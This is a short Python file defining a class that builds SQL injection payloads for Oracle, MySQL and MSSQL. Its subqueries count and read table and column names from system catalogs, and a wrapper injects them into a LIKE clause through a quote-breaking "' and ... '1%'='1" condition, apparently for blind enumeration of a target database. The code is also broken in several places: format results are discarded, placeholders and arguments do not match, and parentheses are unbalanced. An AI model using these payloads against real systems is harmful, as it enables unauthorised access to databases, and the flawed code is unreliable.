class attackQuerys:
    DB_table_name = {'oracle':'user_tables','mysql':'information_schema.tables','mssql':'sys.tables'}
    DB_table_variable_name = {'oracle':'TABLE_NAME','mysql':'TABLE_NAME','mssql':'name'}

    DB_column_name= {'oracle':'user_tab_columns','mysql':'information_schema.columns','mssql':'sys.columns'}
    DB_column_variable_name={'oracle':'COLUMN_NAME','mysql':'COLUMN_NAME','mssql':'name'}

    def __init__(self, DB_type='oracle'):
        self.DB_type = DB_type
    
    

    def get_count_query(self,type):
        if type=='table':
            name, variable_name = attackQuerys.DB_table_name[self.DB_type], attackQuerys.DB_table_variable_name[self.DB_type]
        elif type == 'column':
            name, variable_name = attackQuerys.DB_column_name[self.DB_type], attackQuerys.DB_column_variable_name[self.DB_type]

        base_query = f'select count({variable_name}) from {name}'
        return "("+base_query+")"
    
    def get_length_query(self,type,rownum=0):
        if type=='table':
            name, variable_name = attackQuerys.DB_table_name[self.DB_type], attackQuerys.DB_table_variable_name[self.DB_type]
        elif type == 'column':
            name, variable_name = attackQuerys.DB_column_name[self.DB_type], attackQuerys.DB_column_variable_name[self.DB_type]

        base_query = 'select {} from (select {},rownum as rnum from {})where rnum={})'
        base_query.format(variable_name,variable_name,name)

        if rownum != 0:
            base_query.format(rownum)
        return "("+base_query+")"
    
    def get_complete_query(keyword,query):
        return f"%{keyword}' and " +query+ " and '1%'='1"

        
